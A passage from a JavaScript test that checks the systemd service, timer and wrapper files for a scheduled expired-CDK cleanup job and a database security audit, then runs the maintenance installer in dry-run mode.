    assert.match(shredderService, /ExecStart=\/usr\/local\/sbin\/zaoyoe-cdk-shredder/);
    assert.match(shredderService, /ProtectSystem=strict/);
    assert.match(shredderTimer, /OnCalendar=\*-\*-\* 03:30:00/);

    assert.match(auditService, /ExecStart=\/usr\/local\/sbin\/zaoyoe-db-security-audit/);
    assert.match(auditService, /ProtectSystem=strict/);
    assert.match(auditTimer, /OnCalendar=\*-\*-\* 00,06,12,18:15:00/);

    // 2. Wrappers execution contract
    const shredderWrapper = fs.readFileSync(path.join(artifactDir, 'zaoyoe-cdk-shredder'), 'utf8');
    const auditWrapper = fs.readFileSync(path.join(artifactDir, 'zaoyoe-db-security-audit'), 'utf8');

    assert.match(shredderWrapper, /scripts\/shred-expired-cdks\.js --days 7 --batch 200/);
    assert.match(auditWrapper, /scripts\/audit-db-security\.js/);

    // 3. Installer dry-run verification
    const installerPath = path.resolve(__dirname, '../scripts/install-kvm4-security-maintenance.sh');
    const output = execFileSync(installerPath, ['--dry-run', '--expected-commit', '75e23ac2a6e7a5d1dfbc5117c5216915e0d415f8'], {
        encoding: 'utf8'
    });
    assert.match(output, /Preflight checks passed/);
});
